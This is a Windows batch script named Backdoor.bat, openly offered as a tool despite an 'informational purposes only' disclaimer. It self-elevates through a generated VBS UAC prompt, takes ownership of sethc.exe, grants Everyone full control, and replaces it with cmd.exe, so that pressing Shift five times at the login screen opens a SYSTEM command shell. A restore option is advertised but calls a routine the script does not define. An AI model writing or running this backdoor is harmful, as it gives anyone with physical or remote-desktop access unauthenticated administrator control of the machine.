@Echo Off
SetLocal EnableDelayedExpansion
call :InitDefaults

%#cs%

	Backdoor project is for informational purposes only You take full responsibility for using this software!

%#ce%

Title WindowsBackdoor v!ver!

%#cs%

	Author   : Kabue Murage
	Forums   : 254peepee
	Script   : Backdoor.bat
	Function : Create a commandline backdoor accessible from the windows login screen to manipulate files and directories.

%#ce%

rem Argument handler ..
If /i "[%1]"=="[]" (
		set Prompt_Diag=1
		Rem Prompt for installation [If no arguments parsed.]
		Call :MsgBox 4 "[%~nx0]" "Install a Terminal Backdoor on : \n \n Computer : !computername! \n USername : !username!" "%tmp%\_prompt.vbs" vResponce
		Rem Subroutine MsgBox Assigns the Return code to varibale parsed at the 5th parameter 'vResponce'.
		Rem 	6 = User Accepted installation.
		Rem 	7 = User Declined installation.
		If '!vResponce!' EQU '6' (Call :install "!sSethCPath!" "!sCmdPath!" iExitCode) else (Call :MsgBox 0 "Exiting.." "Run '%~nx0 /?' from terminal for more commandline options." "%tmp%\_prompt.vbs" _vResponce)
		Exit
	) else (set Prompt_Diag=0)

:: ======================== ======================== Region Parse Args ======================== ========================
	If /i "%1"=="-ver" echo !ver!
	If /i "%1"=="-install" (Call :install "!sSethCPath!" "!sCmdPath!" iExitCode &Exit /b)
	Rem If !iExitCode! NEQ 0 Call :TakeownErrorPrint iExitCode
	If /i "%1"=="-restore" (Call :restore_ "!sSethCBackupPath!" "!sCmdPath!" iExitCode &Exit /b)
	Rem If !iExitCode! NEQ 0 Call :TakeownErrorPrint iExitCode
	If /i "%1"=="/h" goto :help 
	If /i "%1"=="/help" goto help
	If /i "%1"=="-h" goto :help
	Exit /b
:: ======================== ===================== End Region Parse Args ======================== =======================


%#cs%

:: 			    		Check for program dependencies if any.. 
:: These dependencies are wrapped using In2batch Resource wrapper available at 
:: 			    		(https://github.com/KabueMurage/In2batch) and provided under MIT License.

FOR %%A In (EULA.txt License.txt README.txt) DO (IF Not Exist "%%A" (Call :Extract_[%%A] "%cd%/%%A"))

%#ce%

:Install [sUtil_FQPN] [sCmdPath] [vReturnVar]
	Call :IsAdmin iAdmin

	If '!iAdmin!' NEQ '0' (
		If '!Prompt_Diag!' EQU '1' (
			Rem Prompt Elevation via diag
			Call :MsgBox 4 "[%~nx0]" "Administrative privileges are required to run this Script, Accept running '%~nx0' as admin ?" "%tmp%\_prompt.vbs" Elevation_Prompt
			If '!Elevation_Prompt!' EQU '6' (Call :vRequireAdmin "!sVbsElevationPath!") else (
				Call :MsgBox 0 "Exiting.." "Relaunch '%~nx0' as Administrator." "%tmp%\_prompt.vbs" _vResponce
				Exit /b 1)
			
		) else (
			Rem Prompt Previlages via cli Choice 
			Echo.
			Echo.  ========================================================
			Echo.    Elevated privileges are required to run this Script
			Echo.         Accept running the current script as admin ?
			Echo.  ========================================================
			Echo. 
			CHOICE /C YN /M "Press Y for Yes, N for No :"
			If !errorlevel! EQU 1 (Call :vRequireAdmin "!sVbsElevationPath!") else (Exit /b 1)
		)
	) else (
		Call :IsAdmin iAdmin
		If '!iAdmin!' NEQ '0' (exit /b 1) else (
			Echo Installing Backdoor..
			takeown /f "%~1"
			takeown /f "%~2"

			icacls "%~1" /grant everyone:F
			icacls "%~2" /grant everyone:F

			IF NOT EXIST "C:/backdoorbackup" (md "C:/backdoorbackup")
			copy "!sSethCPath!" "C:/backdoorbackup/sethc.exe"
			del "!sSethCPath!"
			copy "C:\Windows\System32\cmd.exe" "!sSethCPath!"
			echo press shift five times or [alt+shift+prtsc] to open.
			Pause
		)
	)
		set "End=%TIME%"
exit /b 0
	
rem Dynamic counter.
:cnt [VarName] [VarOutPut] [initialVal]
	If not defined %1 (SET %1=%3)
	Set "%2=%1"
	set /a %1+=1
	set %2=%2
exit /b

:GetCurrentCodePage <iReturnVar>
for /f "tokens=4" %%a in ('chcp') do set %1=%%a
Exit /b

:InitDefaults
	Set "#cs=rem/||(" & set "#ce=)"
	set "ver=1.0"
	set nl=^& echo.
	rem set "sScriptName=%~0"
	rem SET "SCRIPT_DIR=%~dp0"
	set "sVbsElevationPath=%temp%\Elev.vbs"
	rem SethC 
	set "sSethCPath=%windir%\System32\sethc.exe"

	rem CMD Path 
	set sCmdPath=%compspec%
	rem set "sCmdPath=%windir%\System32\cmd.exe"
exit /b 0

rem Func iIfAdmin
rem Confirms Elevated Previlages, Parses to arg1
rem Errorlevel 0 = Success *Administrative permissions confirmed*
rem Errorlevel 1 = Failure *Running in Inadequate permissions*
rem net session >nul 2>&1
rem NET FILE 1>NUL 2>NUL
:IsAdmin [istatusVar]
	>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"  
	REM --> If error flag set, we do not have admin.
	set %1=%errorlevel%
exit /b


If defined %1 (set "%1=%errorlevel%") else (exit /b %errorLevel%)
exit /b


Rem This will self elevate the script so with a UAC prompt since this script needs to be run as an Administrator in order to function properly.
:vRequireAdmin [sVbsPath] [istatusVar: 0 = Got Previlages, 1 = Error]
	echo Set UAC = CreateObject^("Shell.Application"^) > "%~1"
	echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%~1"
	"%~1"
	del /f /q "%~1"
exit /b 0

:uninstall
del /f /q "!sSethCPath!"
copy "C:\backdoorbackup\Sethc.exe" "C:\Windows\System32"
echo restored original file :sethc.exe to System32 folder
exit /b 0

%#cs%
	Buttons     : 
		0 vbOKOnly
		1 vbOKCancel
		2 vbAbortRetryIgnore
		3 vbYesNoCancel
		4 vbYesNo
		5 vbRetryCancel
	Return Codes :
		1 OK was clicked vbOK
		2 Cancel was clicked vbCancel
		3 Abort was clicked vbAbort
		4 Retry was clicked vbRetry 
		5 Ignore was clicked vbIgnore 
		6 Yes was clicked vbYes
		7 No was clicked vbNo
%#ce%

:: MsgBox
:: Displays a simple message box with optional timeout.
::

:MsgBox [flag] [title] [text] [tmp_filehandle] [returnVar]
rem There are five ways to output text to the console:
	rem WScript.Echo "Hello"
	rem WScript.StdOut.Write "Hello"
	rem WScript.StdOut.WriteLine "Hello"
	rem Stdout.WriteLine "Hello"
	rem Stdout.Write "Hello"
	rem WScript.Echo will output to console but only if the script is started using cscript.exe. It will output to message boxes if started using wscript.exe.
:: & vbCrLf
rem call :stringrep %myvar% "/n" "^& vbCrLf &" formated_
rem https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/238kz954(v=vs.84)?redirectedfrom=MSDN

Echo wscript.echo msgbox (Replace(WScript.Arguments(0), "\n" ,Chr^(13^)), "%~1", WScript.Arguments(1)) >> "%~4"
rem msgbox "This is how" & vbcrlf & "to get a new line"
for /f "tokens=* delims=" %%a in ('cscript //nologo "%~4" "%~3" "%~2"') do (
	set %5=%%a=
	del /f /q "%~4")
exit /b 

:help
Set "s_ghelp=Backdoor.bat [optional parameter] @CRLF Parameter List : @CRLF -install       Installs backdoor cmd"
rem echo %s_ghelp:@CRLF=!nl!%

Echo %s_ghelp%
pause
echo. -restore       restores sethc original file
echo.				 From : [C:/backdoorbackup] to 
echo.				 To   : [C:\Windows\System32]
echo.
echo. example :
echo.
echo. Backdoor.bat -install
echo.          or
echo. Backdoor.bat -restore
goto :eof

:eof